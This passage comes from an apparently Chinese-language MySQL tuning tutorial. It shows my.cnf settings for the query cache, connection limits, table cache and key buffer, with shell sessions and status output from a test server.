testdb;SET timestamp=1621078561;select * from test; 6. my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;&#x4F18;&#x5316;&#x603B;&#x539F;&#x5219;&#xFF1A;&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x5C11;&#xFF0C;&#x5219; mysql &#x65BD;&#x5C55;&#x4E0D;&#x5F00;&#xFF1A;&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x591A;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x62D6;&#x7D2F;&#x6574;&#x4E2A; OS 40%&#x8D44;&#x6E90;&#x7ED9;OS&#xFF0C; 60%-70% &#x7ED9;mysql &#xFF08;&#x5185;&#x5B58;&#x548C;CPU&#xFF09; &#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5927;&#x591A;&#x6570;LAMP&#x5E94;&#x7528;&#x90FD;&#x4E25;&#x91CD;&#x4F9D;&#x8D56;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#xFF0C;&#x67E5;&#x8BE2;&#x7684;&#x5927;&#x81F4;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;:PHP&#x53D1;&#x51FA;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;-&gt;&#x6570;&#x636E;&#x5E93;&#x6536;&#x5230;&#x6307;&#x4EE4;&#x5BF9;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x5206;&#x6790;-&gt;&#x786E;&#x5B9A;&#x5982;&#x4F55;&#x67E5;&#x8BE2;-&gt;&#x4ECE;&#x78C1;&#x76D8;&#x4E2D;&#x52A0;&#x8F7D;&#x4FE1;&#x606F;-&gt;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x5982;&#x679C;&#x53CD;&#x590D;&#x67E5;&#x8BE2;&#xFF0C;&#x5C31;&#x53CD;&#x590D;&#x6267;&#x884C;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#xFF1B;MySQL &#x6709;&#x4E00;&#x4E2A;&#x7279;&#x6027;&#x79F0;&#x4E3A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4F1A;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x95EE;&#x9898;&#x662F;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7981;&#x7528;&#x7684;&#x3002; &#x542F;&#x52A8;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF1A;123vim /etc/my.cnf &#x6DFB;&#x52A0;&#xFF1A; [mysqld] #&#x5728;&#x6B64;&#x5B57;&#x6BB5;&#x4E2D;&#x6DFB;&#x52A0; query_cache_size = 32M &#x67E5;&#x770B;&#xFF1A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;1234567891011121314[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.&#xA0; Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.19-log Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 1234567891011121314mysql&gt; show status like &apos;qcache%&apos;;+-------------------------+----------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |+-------------------------+----------+| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33537320 || Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_lowmem_prunes&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_not_cached&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_queries_in_cache | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_total_blocks&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+-------------------------+----------+8 rows in set (0.00 sec) &#x89E3;&#x91CA;&#x5982;&#x4E0B;&#xFF1A; &#x53D8;&#x91CF;&#x540D; &#x8BF4;&#x660E; &#x5907;&#x6CE8; Qcache_free_blocks &#x7F13;&#x5B58;&#x4E2D;&#x76F8;&#x90BB;&#x5185;&#x5B58;&#x5757;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x6570;&#x76EE;&#x5927;&#x8BF4;&#x660E;&#x53EF;&#x80FD;&#x6709;&#x788E;&#x7247; &#x5982;&#x679C;&#x6570;&#x76EE;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;flush query cache;&#x5BF9;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x6574;&#x7406;&#xFF0C;&#x4ECE;&#x800C;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x5757; Qcache_free_memory &#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5927;&#x5C0F; Qcache_hits &#x6BCF;&#x6B21;&#x67E5;&#x8BE2;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x547D;&#x4E2D;&#x65F6;&#x5C31;&#x589E;&#x5927; Qcache_inserts &#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x65F6;&#x5C31;&#x589E;&#x5927;&#xFF0C;&#x5373;&#x6CA1;&#x6709;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x627E;&#x5230;&#x6570;&#x636E; Qcache_lowmem_prunes &#x56E0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5220;&#x9664;&#x7F13;&#x5B58;&#x6B21;&#x6570;&#xFF0C;&#x7F13;&#x5B58;&#x51FA;&#x73B0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5E76;&#x4E14;&#x5FC5;&#x987B;&#x8981;&#x8FDB;&#x884C;&#x6E05;&#x7406;,&#x4EE5;&#x4FBF;&#x4E3A;&#x66F4;&#x591A;&#x67E5;&#x8BE2;&#x63D0;&#x4F9B;&#x7A7A;&#x95F4;&#x7684;&#x6B21;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x6700;&#x597D;&#x957F;&#x65F6;&#x95F4;&#x6765;&#x770B;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x5728;&#x4E0D;&#x65AD;&#x589E;&#x957F;&#xFF0C;&#x5C31;&#x8868;&#x793A;&#x53EF;&#x80FD;&#x788E;&#x7247;&#x975E;&#x5E38;&#x4E25;&#x91CD;&#xFF0C;&#x6216;&#x8005;&#x7F13;&#x5B58;&#x5185;&#x5B58;&#x5F88;&#x5C11; &#x5982;&#x679C;Qcache_free_blocks&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x788E;&#x7247;&#x4E25;&#x91CD;&#xFF1B;&#x5982;&#x679C; free_memory &#x5F88;&#x5C0F;&#xFF0C;&#x8BF4;&#x660E;&#x7F13;&#x5B58;&#x4E0D;&#x591F;&#x7528;&#x4E86; Qcache_not_cached &#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x8FD9;&#x4E9B;&#x67E5;&#x8BE2;&#x672A;&#x88AB;&#x7F13;&#x5B58;&#x6216;&#x5176;&#x7C7B;&#x578B;&#x4E0D;&#x5141;&#x8BB8;&#x88AB;&#x7F13;&#x5B58; Qcache_queries_in_cache &#x5728;&#x5F53;&#x524D;&#x7F13;&#x5B58;&#x7684;&#x67E5;&#x8BE2;&#xFF08;&#x548C;&#x54CD;&#x5E94;&#xFF09;&#x7684;&#x6570;&#x91CF; Qcache_total_blocks &#x7F13;&#x5B58;&#x4E2D;&#x5757;&#x7684;&#x6570;&#x91CF; &#x4F8B;&#xFF1A;&#x4F7F;&#x7528;mysql&#x67E5;&#x8BE2;&#x7F13;&#x5B58;123456789[root@jaking ~]# cat /etc/my.cnf [mysqld]datadir=/data/mysqlsocket=/data/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0query_cache_size=32M #&#x81F3;&#x5C11;4M&#x4EE5;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF1B;&#x6574;&#x4F53;100G&#xFF0C;&#x82E5;&#x6B64;&#x670D;&#x52A1;&#x5668;&#x53EA;&#x8FD0;&#x884C;mysql&#x670D;&#x52A1;&#x5668;&#xFF0C;70-80G&#x7ED9;mysql[root@jaking ~]# systemctl restart mysqld 1234567891011121314151617181920212223242526272829303132333435363738394041[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; create database aa;mysql&gt; use aa;mysql&gt; create table test (id int, name varchar(255)) ;mysql&gt; insert into test values (1,&apos;aaaa&apos;), (2,&apos;aaaa&apos;);mysql&gt; select * from test;mysql&gt; show status like &quot;qcache%&quot;;+-------------------------+----------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |+-------------------------+----------+| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535112 || Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0; -- &#x6CA1;&#x6709;&#x547D;&#x4E2D;| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;|&#xA0; -- &#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BED;&#x53E5;| Qcache_lowmem_prunes &#xA0; | 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_not_cached&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_queries_in_cache | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_total_blocks&#xA0;&#xA0;&#xA0;&#xA0; | 4&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |-- &#x518D;&#x67E5;&#x8BE2;&#xFF1A;mysql&gt; select * from test;mysql&gt; show status like &quot;qcache%&quot;;+-------------------------+----------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |+-------------------------+----------+| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535112 || Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1 | -- &#x7B2C;&#x4E8C;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;&#x4E86;| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Qcache_hits/&#xFF08;Qcache_inserts+ Qcache_hits&#xFF09; &#x547D;&#x4E2D;&#x7387; -- &#x7ECF;&#x8FC7;&#x591A;&#x6B21;select&#xFF0C;&#x547D;&#x4E2D;&#x7684;&#x6B21;&#x6570;&#x4E5F;&#x4F1A;&#x589E;&#x52A0;&#xFF1A;mysql&gt; show status like &apos;qcache%&apos;;&#xA0; +-------------------------+----------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0; |+-------------------------+----------+| Qcache_free_blocks&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || Qcache_free_memory&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 33535344 || Qcache_hits&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | -- &#x7B2C;&#x56DB;&#x6B21;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5C31;&#x547D;&#x4E2D;3&#x6B21;| Qcache_inserts&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | &#x5F3A;&#x5236;&#x9650;&#x5236;MySQL &#x8D44;&#x6E90;&#x8BBE;&#x7F6E;&#x53EF;&#x4EE5;&#x5728;mysqld&#x4E2D;&#x5F3A;&#x5236;&#x4E00;&#x4E9B;&#x9650;&#x5236;&#x6765;&#x786E;&#x4FDD;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x8D44;&#x6E90;&#x8017;&#x5C3D;&#x7684;&#x60C5;&#x51B5;&#x51FA;&#x73B0;&#x3002;123456789101112[root@jaking ~]# vim /etc/my.cnf [mysqld]datadir=/data/mysqlsocket=/data/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0query_cache_size = 32M max_connections=500&#xA0; #&#x4E0A;&#x9650;&#x662F;&#x770B;&#x786C;&#x4EF6;&#x914D;&#x7F6E;wait_timeout=10 max_connect_errors=100[root@jaking ~]# systemctl restart mysqld &#x53C2;&#x6570;&#xFF1A;&#x7B2C;&#x4E00;&#x884C;&#xFF1A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5D29;&#x6E83;&#x4E4B;&#x524D;&#x786E;&#x4FDD;&#x53EA;&#x5EFA;&#x7ACB;&#x670D;&#x52A1;&#x5141;&#x8BB8;&#x6570;&#x76EE;&#x7684;&#x8FDE;&#x63A5;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#x7684;&#x6700;&#x660E;&#x663E;&#x7279;&#x5F81;&#x662F;&#x51FA;&#x73B0;&#x201C;Too many connections&#x201D;&#x9519;&#x8BEF; &#x7B2C;&#x4E8C;&#x884C;&#xFF1A;mysqld&#x5C06;&#x7EC8;&#x6B62;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF08;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF09;&#x8D85;&#x8FC7;10&#x79D2;&#x7684;&#x8FDE;&#x63A5;&#xFF1B;&#x5728;LAMP&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x95F4;&#x901A;&#x5E38;&#x5C31;&#x662F;Web &#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6240;&#x82B1;&#x8D39;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x6709;&#x65F6;&#x5019;&#x5982;&#x679C;&#x8D1F;&#x8F7D;&#x8FC7;&#x91CD;&#xFF0C;&#x8FDE;&#x63A5;&#x4F1A;&#x6302;&#x8D77;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x5360;&#x7528;&#x8FDE;&#x63A5;&#x8868;&#x7A7A;&#x95F4;&#xFF1B;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#x4EA4;&#x4E92;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x4E86;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6301;&#x4E45;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x4F4E;&#x4E00;&#x70B9;&#x3002; &#x7B2C;&#x4E09;&#x884C;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x5728;&#x8FDE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x91CD;&#x8BD5;&#x5F88;&#x591A;&#x6B21;&#x540E;&#x653E;&#x5F03;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x4E3B;&#x673A;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x5B9A;&#xFF0C;&#x76F4;&#x5230;&#x6267;&#x884C;12mysql&gt; FLUSH HOSTS;Query OK, 0 rows affected (0.00 sec) &#x4E4B;&#x540E;&#x624D;&#x80FD;&#x8FD0;&#x884C;&#x3002; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;10 &#x6B21;&#x5931;&#x8D25;&#x5C31;&#x8DB3;&#x4EE5;&#x5BFC;&#x81F4;&#x9501;&#x5B9A;&#x4E86;&#xFF1B;&#x5C06;&#x8FD9;&#x4E2A;&#x503C;&#x4FEE;&#x6539;&#x4E3A;100 &#x4F1A;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#x6765;&#x4ECE;&#x95EE;&#x9898;&#x4E2D;&#x6062;&#x590D;&#xFF1B;&#x5982;&#x679C;&#x91CD;&#x8BD5;100 &#x6B21;&#x90FD;&#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x518D;&#x9AD8;&#x7684;&#x503C;&#x4E5F;&#x4E0D;&#x4F1A;&#x6709;&#x592A;&#x591A;&#x5E2E;&#x52A9;&#xFF0C;&#x53EF;&#x80FD;&#x5B83;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x3002; &#x9A8C;&#x8BC1;&#xFF1A;12345678910111213141516[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;max_used_connections&apos;;+----------------------+-------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value |+----------------------+-------+| Max_used_connections | 1&#xA0; |#&#x5F53;&#x524D;&#x6709;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;+----------------------+-------+1 row in set (0.00 sec)&#x518D;&#x53E6;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6253;&#x5F00;&#x4E00;&#x4E2A;mysql&#x8FDE;&#x63A5;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x4E0B;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E24;&#x4E2A;[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;max_used_connections&apos;;+----------------------+-------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value |+----------------------+-------+| Max_used_connections | 2&#xA0; | &#x603B;&#x7ED3;&#xFF1A;mysql&#x6709;&#x8D85;&#x8FC7;100&#x4E2A;&#x53EF;&#x4EE5;&#x8C03;&#x8282;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8981;&#x8BB0;&#x4F4F;&#x90A3;&#x4E48;&#x591A;&#x57FA;&#x672C;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5E78;&#x8FD0;&#x7684;&#x662F;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x8BB0;&#x4F4F;&#x5F88;&#x5C11;&#x4E00;&#x90E8;&#x5206;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x201C;SHOW STATUS&#x201D;&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;mysql&#x662F;&#x5426;&#x6309;&#x7167;&#x6211;&#x4EEC;&#x7684;&#x671F;&#x671B;&#x5728;&#x8FD0;&#x884C; &#x8868;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x8868;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x8981;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F60;&#x5FC5;&#x987B;&#x5148;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8BFB;&#x53D6;&#xFF1B;&#x4E3A;&#x4E86;&#x52A0;&#x5FEB;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;mysqld &#x5BF9;&#x8FD9;&#x4E9B;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5176;&#x6700;&#x5927;&#x6570;&#x76EE;&#x7531; /etc/my.cnf&#x4E2D;&#x7684; table_open_cache &#x6307;&#x5B9A; &#x4F8B;&#x5982;&#xFF1A;123456789101112131415[root@jaking ~]# vim /etc/my.cnf [mysqld] datadir=/var/lib/mysql &#x2026;&#x2026; table_open_cache=24 &#xA0;#&#x7F13;&#x5B58;24&#x4E2A;&#x8868; [root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt;&#xA0; show global status like &apos;open%_tables&apos;;+---------------+-------+| Variable_name | Value |+---------------+-------+| Open_tables&#xA0;&#xA0; | 1&#xA0;&#xA0;&#xA0;&#xA0; || Opened_tables | 114&#xA0;&#xA0; |+---------------+-------+ Open_tables &#x8868;&#x793A;&#x6253;&#x5F00;&#x8868;&#x7684;&#x6570;&#x91CF;&#xFF0C;Opened_tables&#x8868;&#x793A;&#x6253;&#x5F00;&#x8FC7;&#x7684;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x5982;&#x679C;Opened_tables&#x6570;&#x91CF;&#x8FC7;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x914D;&#x7F6E;&#x4E2D; table_cache(5.1.3&#x4E4B;&#x540E;&#x8FD9;&#x4E2A;&#x503C;&#x53EB;&#x505A;table_open_cache)&#x503C;&#x53EF;&#x80FD;&#x592A;&#x5C0F;table_cache &#x7684;&#x503C;&#x5728; 2G &#x5185;&#x5B58;&#x4EE5;&#x4E0B;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x503C;&#x9ED8;&#x8BA4;&#x4ECE; 256 &#x5230; 512&#x4E2A;&#x5BF9;&#x4E8E;&#x6709; 1G &#x5185;&#x5B58;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x63A8;&#x8350;&#x503C;&#x662F; 128-256 &#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;key_buffer_size&#x6307;&#x5B9A;&#x7D22;&#x5F15;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x7D22;&#x5F15;&#x5904;&#x7406;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x7D22;&#x5F15;&#x8BFB;&#x7684;&#x901F;&#x5EA6; &#x4F8B;&#xFF1A;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x5B58; , &#x7F13;&#x5B58;&#x6765;&#x7F13;&#x5B58;&#x7D22;&#x5F15;123456789101112131415161718[root@jaking ~]# vim /etc/my.cnf [mysqld]datadir=/var/lib/mysql&#x2026;&#x2026;key_buffer_size=512M#&#x53EA;&#x8DD1;&#x4E00;&#x4E2A;mysql&#x670D;&#x52A1;&#xFF0C;&#x7ED3;&#x5408;&#x6240;&#x6709;&#x7F13;&#x5B58;&#xFF0C;mysql&#x6574;&#x4F53;&#x4F7F;&#x7528;&#x7684;&#x7F13;&#x5B58;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;80%[root@jaking ~]# systemctl restart mysqld&#x67E5;&#x770B;&#xFF1A;[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |+-------------------+-------+| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; || Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |+-------------------+-------+2 rows in set (0.00 sec) &#x5173;&#x952E;&#x5B57;&#xFF0C;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;&#x4ED6;&#x7684;&#x8BF7;&#x6C42;&#x5E94;&#x8BE5;&#x6765;&#x81EA;&#x4E8E;&#x5185;&#x5B58;&#x800C;&#x4E0D;&#x662F;&#x78C1;&#x76D8;&#xFF0C;&#x4ECE;&#x8FD9;&#x4E2A;&#x8868;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6709;&#x591A;&#x5C11;&#x662F;Key_reads &#x4EE3;&#x8868;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BF7;&#x6C42;&#x4E2A;&#x6570;&#xFF0C;Key_read_requests &#x662F;&#x603B;&#x6570;&#xFF0C; &#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x6570;&#x9664;&#x4EE5;&#x8BFB;&#x8BF7;&#x6C42;&#x603B;&#x6570;&#x5C31;&#x662F;&#x4E0D;&#x4E2D;&#x6BD4;&#x7387;&#xFF1B;&#x5982;&#x679C;&#x6BCF; 1000 &#x4E2A;&#x8BF7;&#x6C42;&#x4E2D;&#x547D;&#x4E2D;&#x78C1;&#x76D8;&#x7684;&#x6570;&#x76EE;&#x8D85;&#x8FC7; 1 &#x4E2A;&#xFF0C;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x589E;&#x5927;&#x5173;&#x952E;&#x5B57;&#x7F13;&#x51B2;&#x533A;&#x4E86;&#x547D;&#x4E2D;&#x7387;&#xFF1A;(1-(Key_reads / Key_read_requests ) )*100 12345678910111213141516171819202122232425262728293031[root@jaking ~]# mysql -uroot 